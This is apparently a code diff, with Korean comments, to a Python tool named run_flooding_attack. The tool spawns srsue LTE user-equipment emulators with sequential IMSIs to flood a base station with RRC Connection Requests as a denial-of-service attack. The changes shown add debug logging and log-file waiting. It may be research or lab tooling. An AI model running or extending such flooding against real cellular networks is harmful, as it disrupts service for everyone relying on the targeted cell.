@@ -97,6 +97,10 @@ def run_srsue_with_config(config_path: str, log_file: str, usrp_args: Optional[s
     if earfcn is not None:
         cmd.extend(["--rat.eutra.dl_earfcn", str(earfcn)])
     
+    # 디버깅: 첫 번째 UE 실행 시 명령어 출력
+    if imsi and imsi.endswith('000000001'):  # 첫 번째 UE 감지
+        logger.debug(f"srsue 실행 명령어: {' '.join(cmd[:10])}... (전체 {len(cmd)}개 인자)")
+    
     kwargs = {
         'stdout': subprocess.PIPE,
         'stderr': subprocess.PIPE,
@@ -165,6 +169,14 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                         earfcn=earfcn
                     )
                     process_start_time = time.time()
+                    
+                    # 첫 번째 UE 실행 시 상세 정보 출력
+                    if ue_id == 1:
+                        logger.info(f"첫 번째 UE 실행:")
+                        logger.info(f"  IMSI: {imsi}, IMEI: {imei}")
+                        logger.info(f"  로그 파일: {current_log_file}")
+                        logger.info(f"  프로세스 PID: {current_process.pid}")
+                    
                     ue_id += 1
                     if (ue_id - 1) % 50 == 0:
                         logger.info(f"진행 중... UE {ue_id - 1} 실행")
@@ -190,7 +202,16 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                     continue
             
             # RRC Connection Request 전송 확인 (DoS 최적화: Request만 보내고 즉시 종료)
-            if current_process and current_log_file and os.path.exists(current_log_file):
+            if current_process and current_log_file:
+                # 로그 파일이 생성되었는지 확인
+                if not os.path.exists(current_log_file):
+                    # 로그 파일이 아직 생성되지 않았으면 잠시 대기
+                    elapsed = time.time() - process_start_time if process_start_time else 0
+                    if elapsed > 0.5:  # 0.5초 지났는데도 로그 파일이 없으면
+                        logger.debug(f"로그 파일이 생성되지 않음: {current_log_file} (경과: {elapsed:.2f}초)")
+                    time.sleep(0.1)
+                    continue
+                
                 try:
                     with open(current_log_file, 'r', encoding='utf-8', errors='ignore') as f:
                         log_content = f.read()
